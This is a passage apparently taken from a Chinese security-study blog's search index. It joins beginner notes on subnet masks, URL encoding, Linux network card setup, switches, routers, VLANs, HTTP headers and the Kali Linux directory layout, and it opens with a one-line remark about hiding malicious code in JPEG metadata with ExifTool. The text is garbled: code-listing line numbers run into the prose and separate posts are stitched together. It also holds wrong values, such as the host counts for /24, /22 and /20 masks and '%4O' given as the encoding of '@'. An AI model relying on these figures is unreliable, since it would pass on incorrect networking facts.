ExifTool 等特殊工具，可以轻松创建包含元数据中恶意代码的多语言 JPEG 文件。 123sudo -scd /softwareapt install libimage-exiftool-perl VM | Windows Server 2008 R2 Windows Server 2008 安装教程 - 知乎 在虚拟机中安装windows server 2008 - CSDN Windows Server 2008是微软一个服务器操作系统的名称，美国时间2008年2月27,微软正式发布 1234567891011# 下载地址“百度网盘”# 最低系统要求处理器：1.0GHz 32位RAM：128MB磁盘空间：20GB其他要求DVD 驱动器VGA (800 x 600) 或更高分辨率的显示器键盘和鼠标（或其他兼容的指点设备）Internet 访问（可能需要付费） 安装过程","tags":["Kali","VM"],"categories":["网络安全"]},{"title":"计算机网络基础概念","path":"/2020/08/09/计算机网络/","content":"ip 地址 Internet Protocol Address——联网协议地址（又名网际协议地址），是IP Address的缩写。 192.168.1.1 子网掩码 子网掩码：又叫网络掩码，地址掩码。子网掩码不可以单独存在，它必须结合ip地址一起使用。 作用：只有一个，就是将某个IP地址划分成网络地址和主机地址两部分。 255.255.255.0 12324 位掩码可用 ip 数 251 个 32-24=8 11111111 共 255 个22 位掩码可用 ip 数 1019 个 1111111111 共 1023 个20 位掩码可用 ip 数 4091 个 111111111111 共 4096 个 网段 网段：即为广播域。 效果：相同网段（广播域）可以通信 ，不同网段（广播域）不可通信。 区分不同网段的方法： 子网掩码中 255 所对应的位相同即为相同网段，不同即为不同网段（有意外情况） …… 如何判断两个 IP 地址是否在同一个网段 参考： 如何判断两个IP地址是否在同一个网段？什么是子网掩码？ - 知乎 (zhihu.com) 什么是子网掩码 子网掩码不能单独存在，它必须结合 IP 地址一起使用。子网掩码只有一个作用，就是***将某个 IP 地址划分成网络地址和主机地址两部分。*** 说的通俗的话，就是用来分割子网和区分哪些 ip 是同一个网段的，那些不是同一网段的。 例如，两个人都叫张三，但一个张三是张家村的，另一个张三是张村的，那么如何区分这两个张三分别是属于那个村的呢？得让村长来区分，就可以准确的把各自的张三领回村，那么子网掩码就相当于村长，它就是用来区分ip该ip地址是属于那个网段的。 在实际项目中，我们通常会遇到这样的 ip 地址。我们可以直接的判断，他们是同属于一个网段的 ip 地址。 123ip地址：192.168.1.1 子网掩码：255.255.255.0ip地址：192.168.1.2 子网掩码：255.255.255.0 那么对于下面这样的呢？ 123ip地址：192.168.1.1 子网掩码：255.255.255.0ip地址：192.168.1.2 子网掩码：255.255.0.0 这两个ip地址虽然在不看掩码的情况下，比较像，但他们并不是同一个网段内的。 这个可以从子网掩码来判断， 123192.168.1.1 255.255.255.0 是属于 192.168.1.0 网段的。而 192.168.1.2 255.255.0.0 是属于 192.168.0.0 网段。 如何根据掩码来确定IP地址网段 如何确定子网掩码和**判断 ip 地址的网段**。 通常我们在划分 vlan 的时候会使用以下例子： 例1： 123创建 vlan1：ip地址：192.168.1.1 子网掩码：255.255.255.0创建 vlan2: ip地址：192.168.2.1 子网掩码：255.255.255.0 那么他们是不是在同一个网段呢？平时配置 ip 地址较多的朋友，可以直观的判断，他们并不是属于同一个网段，那么如何计算呢？要想判断两个 ip 地址是不是在同一个网段，只需将 ip 地址与子网掩码做与运算，如果得出的结果一样，则这两个 ip 地址是同一个子网当中。 详细计算 1234567891011121314151617181920212223242526272829303132333435363738394041将ip地址 192.168.1.1 转换为二进制11000000 10101000 00000001 00000001将子网掩码255.255.255.0转换成二进制11111111.11111111.11111111.00000000然后将两者相“与（and）&quot;运算：（与运算的运算规则：0&amp;0=0；0&amp;1=0；1&amp;0=0；1&amp;1=1，即：两位同时为“1”，结果才为“1”，否则为“0”。负数按补码形式参加按位与运算）11000000 10101000 00000001 0000000111111111.11111111.11111111.00000000然后得到：11000000 10101000 00000001 00000000转换成网络号就是：192.168.1.0将ip地址192.168.2.1转换为二进制11000000 10101000 00000010 00000001将子网掩码255.255.255.0转换成二进制11111111.11111111.11111111.00000000然后将两者相“与（and）&quot;运算：11000000 10101000 00000010 0000000111111111.11111111.11111111.00000000然后得到：11000000 10101000 00000010 00000000转换成网络号就是：192.168.2.0 很明显，二者的结果是不一样的，一个是网段192.168.1.0，一个是网段192.168.2.0，所以不是一个网段。 例2 123ip地址1：192.168.1.1 子网掩码：255.255.252.0ip地址2：192.168.2.1 子网掩码：255.255.252.0 很明显，我们这个和上面例1的 ip 地址是一样的，只是子网掩码不一样，如果不看子网掩码，首先可能就判断他们不是同一个网段。 这里面和上面例1中唯一变化就是子网掩码从255.255.255.0换成了255.255.252.0了，那我们来看下，他们是否属于同一个网段。 详细计算 1234567891011121314151617181920212223242526272829303132333435363738394041将 ip 地址 192.168.1.1 转换为二进制11000000 10101000 00000001 00000001将子网掩码 255.255.252.0 转换成二进制11111111.11111111.11111100.00000000然后将两者相“与（and）&quot;运算：11000000 10101000 00000001 0000000111111111.11111111.11111100.00000000然后得到：11000000 10101000 00000000 00000000转换成网络号就是：192.168.0.0将ip地址192.168.2.1转换为二进制11000000 10101000 00000010 00000001将子网掩码255.255.252.0转换成二进制11111111.11111111.11111100.00000000然后将两者相“与（and）&quot;运算：11000000 10101000 00000010 0000000111111111.11111111.11111100.00000000然后得到：11000000 10101000 00000000 00000000转换成网络号就是：192.168.0.0 很明显，二者的结果是一样的，都是属于 192.168.0.0 网段，所以他们是同属于一个网段。 当然，如果对子网较熟了就不需要经过这些运算了，大部分的网段可以通过分析子网掩码与 ip 地址就可以判断出来是否属于网一网段，但前提是你需要熟悉网段的原理与运算的方法。 如何根据 IP 地址推算子网掩码 确定ip地址子网掩码 大部分的情况下，我们网络中只要不超过 254 台主机的的话，子网掩码都可以设置成 255.255.255.0。那么超过了 254 台主机的话怎么办呢？ 可以划分 vlan，也可以设置成一个大网段，划分 vlan 我们就不说了，上面有例子，设置成一个大网段就有一个难点，如何确定这个大网段里面的子网掩码呢？ 例如 假设监控网络中有 600 个点位，我们现在也不想把它划分 vlan（实际项目中大部分是会划分vlan的），假设只想用一个大网段把这 600 个点位分配 ip 地址，如何设置 ip 地址，如何确实子网掩码？ **分析：**首先我们知道 600 个点位，可以使用 3 个 254 个 ip 地址段来分配。 可以使用 12345ip段一：192.168.0.1——192.168.0.254ip段二：192.168.1.1——192.168.1.254ip段三：192.168.2.1——192.168.2.254 每个网段有 254 个ip地址，完全够 600 个点位用的。 那么问题来了，如果要使这三个 ip 段在同一个网段内，那么这个大网段共同的子网掩码是多少呢？ 我们来分析下： 123456789101112131415161718192021222324252627将ip地址192.168.0.1转换为二进制11000000 10101000 00000000 00000001将ip地址192.168.1.1转换为二进制11000000 10101000 00000001 00000001将ip地址192.168.2.1转换为二进制11000000 10101000 00000010 00000001转换成了二进制，可以看得出，三个ip段的二进制前面22位的是不变的，那么可以将他们表示成：ip段一：192.168.0.1/22ip段二：192.168.1.1/22ip段三：192.168.2.1/22这种192.168.2.x/22形式的ip地址相信大家平时都见过，就是已经告诉了子网掩码了。也就是说他们共同的子网掩码二进制前面22个都是1。11111111 11111111 11111100 00000000转换成十进制，那就是255.255.252.0，所以他们共同的子网掩码就是255.255.252.0。 认识网址 搜索关键字： URL 编码 “…Only alphanumerics [0-9a-zA-Z], the special characters “$-_.+!*'(),” [not including the quotes - ed], and reserved characters used for their reserved purposes may be used unencoded within a URL.” “只有字母和数字[0-9a-zA-Z]、一些特殊符号“$-_.+!*'(),”[不包括双引号]、以及某些保留字，才可以不经过编码直接用于URL。” URL 编码 参考： URL编码是什么？ - 知乎 (zhihu.com) URL——详解_正在过坎的博客-CSDN博客_url详解 URL中的保留和不安全字符 (bbsmax.com) 当 URL 路径，或者查询参数中带有中文、特殊字符的时候，就需要对 URL 进行编码（采用十六进制编码格式）。URL 编码的原则是使用安全字符（即没有特殊用途或者特殊意义的字符）去表示那些不安全的字符。 为什么需要URL编码 URL 的编码格式采用的是 ASCII 码而非 Unicode，这表明 URL 中不允许包含任何非 ASCII 字符（比如中文），否则就会造成 URL 解析错误。 URL 中的某些字符会引起歧义，比如若 URL 查询参数中包含”&amp;”或者”%”就会造成服务器解析错误 URL 组成 一个 URL 的基本组件包括 协议 域名/主机\t端口号 路径 查询字符串 锚点 其中路径和查询字符串之间使用问号?隔离，示例如下： 主机 主机（host）是资源所在的网站名或服务器的名字，又称为域名。上例的主机是www.example.com。 有些主机没有域名，只有 IP 地址，比如192.168.2.15。这种情况常常出现在局域网。 端口 同一个域名下面可能同时包含多个网站，它们之间通过端口（port）区分。“端口”就是一个整数，可以简单理解成，访问者告诉服务器，想要访问哪一个网站。HTTP 协议的默认端口是80，如果省略了这个参数，服务器就会返回80端口的网站。 端口紧跟在域名后面，两者之间使用冒号分隔，比如www.example.com:80。 虚拟目录 互联网的早期，路径是真实存在的物理位置。现在由于服务器可以*模拟这些位置*，所以路径只是虚拟位置。 路径可能只包含目录，不包含文件名，比如/foo/，甚至结尾的斜杠都可以省略。这时，***服务器通常会默认跳转***到该目录里面的index.html文件（即等同于请求/foo/index.html），但也可能有其他的处理（比如列出目录里面的所有文件），这取决于服务器的设置。一般来说，访问www.example.com这个网址，很可能返回的是网页文件www.example.com/index.html。 123/app/user/从第一个斜杠 / 开始，到最后一个斜杠 / 结束的那部分，即为虚拟目录第一个 / 为根目录，每多一个 / 就多进入一层目录 文件名 123从域名后开始算起的最后一个 / 开始，到 ? 为止没有 ? 则到 # 为止都没有就是到整个 URL 结束为止的那部分就为文件名 一般包含文件名和扩展名，用来指代一个 URL 所访问的具体文件或资源，它可以是图片、html 文件、css 文件，也可以是 js 文件、字体文件等等，它也可以不是某种文件，而是服务端后台执行的某段程序。 甚至可以省略不写虚拟目录和文件名，因为它们本来就不是必须的，服务器会在缺省的情况下给你定位到某个特定的文件或程序上去。 查询参数 1从 ? 后到 # 结束，即图中的 ?uid=101&amp;ty=2 为查询参数 查询参数，也称为 URL 参数、查询字符串，英文名为 Query，它是用来向服务端以字符串的形式传递参数和少数数据用的 URL的参数是一个个键值对，即一个key对应一个value，多个键值对应**&amp;**连起来：例如a=1&amp;b=2 URL编码： 但参数要传递的某些值往往带有特殊字符，这些字符和 URL 标准的格式冲突，比如要传a&amp;b这样字符串，和查询参数键值对的连接符 &amp; 冲突了，若不加以区分就会产生歧义 而最简单的办法，就是对参数值进行编码，称为 URL Encoding，通过编码，就不再包含会冲突的特殊字符a&amp;b 可以改为 a%26b 锚点 1#后面那部分字符串，#abc就是锚部分 锚，英文称做Reference，通常也是用来传递参数等信息，但与查询参数的本质区别就是这部分内容不会被传递到服务器端 锚一般用于页面，比如在浏览网页的时候，按个按钮突然帮你定位到页首或页面中的某个位子去了，这就是锚 现在随着前后端分离技术，尤其是 vue、reactjs 等前端框架的兴起，锚作为前端javascript程序处理的参数载体也越来越重要了 URL 字符 查询字符串中空格被编码成+号 12345678URL 的各个组成部分，只能使用以下这些字符。26个英语字母（包括大写和小写）10个阿拉伯数字连词号（-）句点（.）下划线（_）此外，还有18个字符属于 URL 的保留字符，只能在给定的位置出现。比如，查询参数的开头是问号（?），也就是说，问号只能出现查询参数的开头，出现在其他位置就是非法的，会导致网址解析错误。网址的其他部分如果要使用这些保留字符，必须使用它们的转义形式。 12345678910111213141516171819202122232425URL 字符转义的方法是，在这些字符的十六进制 ASCII 码前面加上百分号（%）字符 描述 用法 编码; 分号 保留 %3B/ 斜线 保留 %2F? 问号 保留 %3F: 冒号 保留 %3A@ “at”符号 保留 %4O= 等号 保留 %3D&amp; “和”符号 保留 %26&lt; 小于号 不安全 %3C&gt; 大于号 不安全 %3E&quot; 双引号 不安全 %22# 井号 不安全 %23% 百分号 不安全 %25&#123; 左大括号 不安全 %7B&#125; 右大括号 不安全 %7D| 竖线 不安全 %7C\\ 反斜线 不安全 %5C^ 加字号 不安全 %5E~ 波浪 不安全 %7E[ 左中括号 不安全 %5B] 右中括号 不安全 %5D` 反单引号 不安全 %60 空格 不安全 %20 举例来说，有一个网页的 URL 是foo?bar.html，即文件里面包含一个问号，那么需要写成foo%3Fbar.html。 URL 的合法字符，其实也可以采用这种转义方法，但是不建议使用。比如，字母a的十六进制 ASCII 码是61，转义形式后就是%61。因此，www.apple.com又可以写成www.%61pple.com，浏览器一样识别 。 既不属于合法字符、也不属于保留字符的其他字符（比如汉字），理论上不需要手动转义，可以直接写在 URL 里面，比如www.example.com/中国.html，浏览器会自动将它们转义，发给服务器。转义方法是使用这些字符的十六进制 UTF-8 编码，每两位算作一组，然后每组头部添加百分号（%）。 绝对 URL 和相对 URL 绝对 URL 指的是，只靠 URL 本身就能确定资源的位置。这意味着，URL 必须带有资源的完整信息，包含协议、主机、路径等部分。前面的例子都是绝对 URL。 相对 URL 指的是，URL 不包含资源位置的全部信息，必须结合当前网页的位置，才能定位资源。比如，当前网页的 URL 是 1https://www.example.com/path/index.html 该网页上面有一个资源，URL 指向a.html，这个就是相对 URL。因为只知道a.html，并不能定位资源。浏览器假定，a.html与当前网址在同一个子目录下面，从而得到绝对 URL 1https://www.example.com/path/a.html 相对 URL 如果以斜杠（/）开头，就表示网站的根目录。否则，必须以当前目录为起点，推算资源的位置。比如，相对 URL /foo/bar.html表示网站根目录的子目录foo，foo/bar.html表示在当前目录的foo子目录 URL 还可以使用两个特殊简写，表示特定位置。 .：表示当前目录，比如./a.html（当前目录下的a.html文件） ..：表示上级目录，比如../a.html（上级目录下的a.html文件） 这两种简写可以多个连用，比如../../表示上两级目录。 绝对 URL 也可以使用这两个简写，比如www.example.com/./index.html等同于www.example.com/index.html，这时.相当于根目录的当前目录，即根目录本身。 实现 URL 的编码与解码编码转换工具 Linux网卡 Linux网卡配置与绑定 在linux系统中进行网络管理，使用 ifconfig 命令。 但 ifconfig 命令配置的网卡信息，在网卡重启后机器重启后，配置就不存在。要想将上述的配置信息永远的存的电脑里，那就要修改网卡的配置文件了 一般来说，先通过ifconfig命令，先查看本机网卡配置 可以看到本机只有一个网卡ens33 123456ens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 ether 00:0c:29:61:cb:98 txqueuelen 1000 (Ethernet) RX packets 1175 bytes 77066 (75.2 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 223 bytes 22817 (22.2 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 进入本机网卡配置文件，可以发现里面没有IP地址、子网掩码、网关和DNS等 1vim /etc/sysconfig/network-scripts/ifcfg-ens33 12345678910111213141516171819202122TYPE=&quot;Ethernet&quot; #网卡类型为以太网BOOTPROTO=&quot;dhcp&quot; #启用地址协议 –static:静态协议 –bootp:协议 –dhcp:协议 -none:不指定协议[最好指定]DEFROUTE=&quot;yes&quot; # 默认路由：是；就是default route，是否把这个eth设置为默认路由PEERDNS=&quot;yes&quot;PEERROUTES=&quot;yes&quot;IPV4_FAILURE_FATAL=&quot;no&quot; # 是不开启IPV4致命错误检测：否IPV6INIT=&quot;yes&quot; # IPV6是否自动初始化: 是IPV6_AUTOCONF=&quot;yes&quot; # IPV6是否自动配置IPV6_DEFROUTE=&quot;yes&quot; # IPV6是否可以为默认路由IPV6_PEERDNS=&quot;yes&quot;IPV6_PEERROUTES=&quot;yes&quot;IPV6_FAILURE_FATAL=&quot;no&quot; # 是不开启IPV6致命错误检测：否IPV6_ADDR_GEN_MODE=&quot;stable-privacy&quot; # IPV6地址生成模型：stable-privacy [这只一种生成IPV6的策略]NAME=&quot;ens33&quot; # 网卡物理设备名称 UUID=&quot;cc35a411-1918-4cad-9496-3474176e00f4&quot; #通用唯一识别码DEVICE=&quot;ens33&quot; # 网卡设备名称, 必须和 `NAME` 值一样ONBOOT=&quot;yes&quot; #系统启动时是否设置此网络接口，设置为yes时，系统启动时激活此设备 1234567# 新增IPADDR=192.168.103.203 #网卡对应的ip地址PREFIX=24 # 子网 24就是255.255.255.0GATEWAY=192.168.103.1 #网关 DNS1=114.114.114.114 # dnsHWADDR=78:2B:CB:57:28:E5 # mac地址 12# 重启网卡service network restart PREFIX与NETMASK的作用一样 ip命令常用参数 123456789101112131415161718Ip [选项] 操作对象&#123;link|addr|route...&#125;# ip link show # 显示网络接口信息# ip link set eth0 upi # 开启网卡# ip link set eth0 down # 关闭网卡# ip link set eth0 promisc on # 开启网卡的混合模式# ip link set eth0 promisc offi # 关闭网卡的混个模式# ip link set eth0 txqueuelen 1200 # 设置网卡队列长度# ip link set eth0 mtu 1400 # 设置网卡最大传输单元# ip addr show # 显示网卡IP信息# ip addr add 192.168.0.1/24 dev eth0 # 设置eth0网卡IP地址192.168.0.1# ip addr del 192.168.0.1/24 dev eth0 # 删除eth0网卡IP地址# ip route list # 查看路由信息# ip route add 192.168.4.0/24 via 192.168.0.254 dev eth0 # 设置192.168.4.0网段的网关为192.168.0.254,数据走eth0接口# ip route add default via 192.168.0.254 dev eth0 # 设置默认网关为192.168.0.254# ip route del 192.168.4.0/24 # 删除192.168.4.0网段的网关# ip route del default # 删除默认路由 为什么要设置DNS PING 外网其它主机，允许网卡访问外网主机 12# 没设置 DNS 的话就失败了[root@localhost ~]# ping baidu.com 为什么上不去网呢？这是因为当前 CentOS 还解析不了输入的 baidu.com 这个字符串, 我知道它是百度的域名, 你也知道, 但它就是不知道这是百度域名, 它解析 baidu.com 域名到底是对应哪一IP地址, 那好了, 去电脑本体下 ping 一下 baidu.com 这个域名, 给它加到 CentOS 系统的 hosts 文件这事也就靠谱了 配置网卡设备文件添加DNS域名解析服务器地址 12DNS1=114.114.114.114 # 是国内移动、电信和联通通用的DNSDNS2=8.8.8.8 # GOOGLE公司提供的DNS,适合国外以及访问国外网站的用户使用 添加DNS域名解析服务器地址, 就是让 CentOS7 在使用 ping 命令时, 一看给的是一个字串符而非IP地址, 就通过 域名解析服务器 查找对应的IP地址, 然后通过IP去 ping 对应的主机这事也就妥妥的了, 简单的说明这个问题它就是这样, 要想知道它具体都干什么事情了, 你还得去研究一下 网络参考模型 以及 协议 这些事！ 交换机 参考： 「网络安全」网络设备篇_51CTO博客 交换机概述 - 博客园 交换机的简介及数据通信过程_51CTO博客 开宗明义，概念先行 交换机是一个扩大网络的设备，能为子网中提供更多的连接端口，以便连接更多的电脑。 通俗来说其起到的作用就是把一个网络端口分成多个网络端口，就像从一根水管里流出的水，你用多根水管同时去分流。· 交换机是一种开关，用于电信号转化成网络信号，可以接入任何两个网络节点，并且提供专门的电信号通路，最经常使用就是太网交换机。 交换机是构建局域网络不\t可或缺的集线设备。作为局域网通信的重要枢纽和节点，其主要功能就是连接设备。交换机最主要的功能就是连接计算机、服务器、网络打印机、网络摄像头、IP电话 等终端设备，并实现与其他交换机、无线接入点、网络防火墙、路由器等网络设备的互连，从而构建局域网络，实现所有设备之间的通信 交换机工作在OSI模型的数据链路层 交互机的工作原理 交换机位于OSI参考模型中的数据链路层（即第二层），是一种基于MAC地址识别的，用于完成数据的封装和转发的网络设备。交换机可以“学习”MAC地址，并把其存放在内部地址表中，通过在数据帧的始发者和目标接收者之间建立临时的交换路径，使数据帧直接由源地址到达目的地址。 因此，交换机就像是一个业务熟练的调度员，能够准确地将装载数据的汽车从出发路口直接派送至目的地路口。当然，要完成这样繁重和智能化的工作，交换机也需要一个学习和记忆的过程。计算机借助网卡连接到局域网络，而每块网卡都有其与生俱来的“胎记”——MAC地址。交换机通过“学习”，会把连接到每个端口的MAC地址记住，形成一个端口与MAC地址的对应表。 MAC 地址也称为物理地址，硬件地址和老化地址。 交换机工作过程 （1）当交换机从某个端口收到一个数据包时，先读取包头中的源MAC地址，从而建立源端口与源MAC地址的对应关系，并将其添加至地址表。由于交换机能够自动根据收到的以太网帧中的源MAC地址更新地址表的内容，所以交换机使用的时间越长，学习到的MAC地址就越多，未知的MAC地址就越少，因而广播的包就越少（如果目的MAC地址未知，则将该包作广播包处理），处理速度就越快。 （2）读取包头中的目的MAC地址，并在地址表中查找相应的端口。 （3）如果地址表中有与该目的MAC地址对应的端口，则把数据包直接复制到这端口上。由于不是将该帧发送到所有端口，从而使那些既非源端口又非目的端口的端口间仍然可以进行相互间的通信，进而提供了更高的传输速率。 （4）如果在MAC地址表中没有找到该MAC地址，也就是说，该目的MAC地址是首次出现，则将该帧发送到所有其他端口（源端口除外），相当于该帧是一个广播帧。拥有该MAC地址的网卡在接收到该广播帧后，将立即作出应答，从而使交换机将“端口号-MAC地址”对照表添加到地址表。不断重复上述过程，交换机即可实现所有数据的转发，并逐步学习和记忆整个网络中的MAC地址，不断丰富和完善自己的MAC地址表。 总结：由此可见，交换机的工作过程可以概括为“学习-记忆-接收-查找-转发”。 通过广播方式“学习”网卡MAC地址，并将“MAC地址-端口号”的对应关系创建为一个地址表“记忆”在内存中。 从源端口“接收”到数据后，在地址表中“查找”与目的MAC地址相对应的端口，然后将数据帧“转发”至目的端口。 注意：交换机不会永久性地记住所有的端口号―MAC地址关系。 由于交换机中的内存有限，因此能够记忆的MAC地址数量也是有限的。 既然不能无休止地记忆所有的MAC地址，那么也必须赋予其相应的忘却机制，从而吐故纳新。 事实上，交换机设计了一个自动老化时间（Auto-aging Time）机制，若某MAC地址在一定时间内（默认为300 s）不再出现，那么交换机将自动把该MAC地址从地址表中清除。 当下一次该MAC地址重新出现时，将会被当做新地址处理。 另外，由于地址表是保存在内存中的，因此当交换机断电或重新启动后，地址表数据将会全部丢失，必须重新学习。 交换机可以在任意一对端口之间建立临时专用通道，不同端口间的转发可以并行操作。 这就像是在各端口间建立起了一座立交桥，形成立体交叉结构，不同流向的数据各行其道，每个端口均能够独享固定带宽，传输速率几乎不受计算机数量的影响。 另外，当两个或两个以上的端口与同一目的端口进行通信时，交换机将把这些数据帧暂时保存在缓存中，然后根据顺序对其逐一处理和转发，从而实现“多”对“一”的通信。 路由器 参考： 路由器的基本原理与配置命令（静态路由和默认路由） 交换机和路由器的数据包转发流程简述_丿咫尺天涯的博客-CSDN博客 开宗明义，概念先行 路由器工作在OSI参考模型的网络层，它的作用是为数据包选择最佳路径，最终送达目的地。 路由器（Router），是连接因特网中各局域网、广域网的设备，它会根据信道的情况自动选择和设定路由，以最佳路径，按前后顺序发送信号。路由器是互联网络的枢纽，“交通警察”。 路由器（Router）又称***网关设备***（Gateway）是用于连接多个逻辑上分开的网络，所谓逻辑网络是代表一个单独的网络或者一个子网。 路由器的工作原理 路由表是路由器的地图，指引路由器的方向。 在路由表中，包含了每个路由器所掌握的所有*目的地的网络地址*，以及通过此路由器到达这些网络的最佳路径。 这个最佳路径是指路由器的***某个接口或下一跳路由器的地址***，由于路由表的存在，路由器才能高效的进行数据包的转发。 交换机和路由器的数据包转发流程 网络设备之间通信： 发送端的数据向外发送一个数据包 系统判断这个数据包的目标地址是否在*同一个网段* 若与发送机属于同一网段，系统直接将数据包封装成帧，通过二层设备发送到本网段内的目标地址 若不在同一网段，系统将数据包转发到*网关*，重新封装 网关查看数据包送达的目标ip地址 系统根据目标ip地址查找路由表，决定转发端口 重新封装转发到下一个路由器 网关发现目标地址属于本网段，查找MAC表（ip与mac对应关系），封装成帧发送到目标机器网卡 目标主机验证后传送给上层应用 具体路由器转发规则： 当主机A发向主机B的数据流在网络层封装成IP数据包，IP数据包的首部包含了源地址和目标地址 主机A会用本机配置的24位IP网络掩码255.255.255.0与目标地址进行与运算，得出目标网络地址与本机的网络地址*是不是在同一个网段*中。如果不是将IP数据包转发到网关 在发往网关前主机A还会通过ARP的请求获得默认网关的MAC地址。在主机A数据链路层IP数据包封装成以太网数据帧，然后才发住到网关……也就是路由器上的一个端口 当网关路由器接收到以太网数据帧时，发现数据帧中的目标MAC地址是自己的某一个端口的物理地址，这时路由器会把以太网数据帧的封装去掉。路由器认为这个IP数据包是要通过自己进行转发，接着它就在匹配路由表。匹配到路由项后，它就将包发往下一条地址。 路由器转发数据包就是这样，所以它始终是不会改IP地址的。只会改MAC VLAN 参考： VLAN技术浅谈-新华三集团-H3C 开宗明义，概念先行 vlan的全称是Virtual Local Area Network，即“虚拟局域网”，把一个大的局域网，分成多个隔离的，小的局域网。 它的作用就是将物理上互连的网络在逻辑上划分为多个互不相干的网络，这些网络之间是无法通讯的，就好像互相之间没有连接一样，因此广播也就隔离开了。VLAN的实现原理非常简单，通过交换机的控制，某一VLAN成员发出的数据包交换机只发给同一VLAN的其它成员，而不会发给该VLAN成员以外的计算机。简言之，一个VLAN就是一个广播域。 为什么需要 vlan 广播域被限制在一个 VLAN 内，节省了带宽，提高了网络处理能力。 增强局域网的安全性：VLAN 间不能直接通信，即一个 VLAN 内的用户不能和其它 VLAN 内的用户直接通信，而需要通过路由器或三层交换机等三层设备。 灵活构建虚拟工作组：用 VLAN 可以划分不同的用户到不同的工作组，同一工作组的用户也不必局限于某一固定的物理范围，网络构建和维护更方便灵活。 OSI 参考模型 参考： [OSI七层模型与TCP/IP五层模型](https://www.cnblogs.com/qishui/p/5428938.html) TCP/IP五层协议 Http 头信息 HTTP headers - 腾讯云 Http头信息（一）——通用头信息（一） Http头信息（二）——请求头信息（一） Http头信息（三）——响应头信息（一） 这可能是最全的Http头信息资料了 请求和响应都有的 1234567891011121314/* 对于请求来说，该指令的意思是：可以给我缓存，但是这个缓存必须是向服务器验证后证明是有效的。对于响应来说，该指令的意思是：可以缓存这个响应，但使用前必须向服务器做有效性验证 */Cache-Control:no-cache/* 对于请求和响应来说，不得以任何形式存储请求或响应的内容 */Cache-Control:no-store/* 对于请求来说，可以接收：自响应被发送那一刻开始算起，不超过60秒的缓存对于响应来说，这个响应可以缓存，且有效期为60秒 */Cache-Control:max-age=60/* 对于请求和响应来说，缓存不能改变其内的媒体类型。例如不能压缩等 */Cache-Control:no-transform 请求专用的 12345678/* 可以接收过了有效期(max-age指定)，但是没过max-stale的缓存 */\tCache-Control:max-stale=60/* 可以接收在未来60秒内，处于有效期(max-age指定)的缓存 */Cache-Control:min-fresh=60/* 只接收缓存。如果没有缓存，则返回 504 Gateway Timeout */Cache-Control:only-if-cached 响应专用的 12345678910111213141516/* 此响应可以被任何中间者缓存 */Cache-Control:public/* 此缓存只能被发起请求的客户端缓存 */Cache-Control:private/* 缓存过期后，使用前，必须向服务器做有效性验证。在Http 1.1规范里，是允许某些情况下直接使用过期缓存的。而加入这个命令，就决不允许使用过期缓存了 */Cache-Control:must-revalidate/* 与must-revalidate一致，区别为：这个指令不能作用于私有缓存上。什么是私有缓存？Cache-Control:private会将缓存存在私有缓存中 */Cache-Control:proxy-revalidate/* 与max-age类似，这里的s代表共享，并且，这个指令仅用于CDNs或者其他中间者（intermediary caches）。这个指令会覆盖max-age和expires响应头 */Cache-Control:s-maxage=60 http 头部 http 头部： 请求： User-Agent——关于浏览器和它平台的信息，如 Mozilla4.0 Accept——客户能处理的页面的类型，如 text、html Accept-Charset——客户可以接受的字符集，如 Unicode-1-1 Accept-Encoding——客户处理的页面编码方式，如 gzip Accept-Language——客户能处理的自然语言，如 en（英语），zh-cn（简体中文） Host——服务器的 DNS 名称，从 URL 中提取出来，必须 Referer——用户从改 URL 代表的页面触发访问当前请求的页面 Cookie——将以前设置的 Cookie 送回服务器，可用来作为会话信息 双向： Date——消息被发送的日期和时间 响应： Server——服务器的信息 Content-Encoding——内容是如何编码的 Content-Language——页面使用的自然语言 Content-Length——以字节计算的页面长度 Content-type——页面的 MIME 类型 Last-Modified——页面最后修改的时间和日期，在页面缓存机制中意义重大 Location——指示客户将请求发送给别处，即重定向到另一个 URL Set-Cookie——服务器希望客户保存一个 Cookie 转义字符 1在MYSQL中 &#x27;\\&#x27;(反斜杠)被用来转义一个字符。转义一个字符意味着取消该字符的特殊用途。使用转义字符可以得到更清楚的图片 http 请求中的 payload payload，翻译过来是有效载荷 抽象一下，payload 可以理解为一系列信息中最为关键的信息。 对于程序员来说就是在程序中 起关键作用的代码。 安全方面： 通常在传输数据时，为了使数据传输更可靠，要把原始数据分批传输，并且在每一批数据的头和尾都加上一定的辅助信息， 比如数据量的大小、校验位等，这样就相当于给已经分批的原始数据加一些外套，这些外套起标示作用，使得原始数据不易丢失， 一批数据加上“外套”就形成了传输通道的基本传输单元，叫做数据帧或数据包，而其中的原始数据就是 payload Kali Linux 文件系统 默认的文件系统 /bin： bin 是 Binaries (二进制文件) 的缩写， 这个目录存放着最经常使用的命令。 /boot 这里存放的是启动 Linux 时使用的一些核心文件，包括一些连接文件以及镜像文件。 **/dev ** dev 是 Device(设备) 的缩写， 该目录下存放的是 Linux 的外部设备，在 Linux 中访问设备的方式和访问文件的方式是相同的。 /etc etc 是 Etcetera(等等) 的缩写，这个目录用来存放*所有的系统管理所需要的配置文件和子目录。* /home 用户的主目录，在 Linux 中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的 /lib lib 是 Library(库) 的缩写这个目录里存放着系统最基本的动态连接共享库，其作用类似于 Windows 里的 DLL 文件。几乎所有的应用程序都需要用到这些共享库。 /media Linux 系统会自动识别一些设备，例如 U 盘、光驱等等，当识别后，Linux 会把识别的设备挂载到这个目录下。 /mnt 系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将光驱挂载在 /mnt/ 上，然后进入该目录就可以查看光驱里的内容了。 /opt opt 是 optional(可选) 的缩写，这是给主机额外安装软件所摆放的目录。比如你安装一个 Oracle 数据库则就可以放到这个目录下。默认是空的。 /root 该目录为系统管理员，也称作超级权限者的用户主目录。 /tmp tmp 是 temporary(临时) 的缩写这个目录是用来存放一些临时文件的。 /usr usr 是 unix shared resources(共享资源) 的缩写，这是一个非常重要的目录，用户的很多应用程序和*文件*都放在这个目录下，类似于 windows 下的 program files 目录。 /usr/bin 系统用户使用的应用程序。 /usr/sbin 超级用户使用的比较高级的管理程序和系统守护程序。 /usr/src 内核源代码默认的放置目录。 /var var 是 variable(变量) 的缩写，这个目录中存放着在不断扩充着的东西，我们习惯将那些经常被修改的目录放在这个目录下。包括各种日志文件。 /run 是一个临时文件系统，存储系统启动以来的信息。当系统重启时，这个目录下的文件应该被删掉或清除。如果你的系统上有 /var/run 目录，应该让它指向 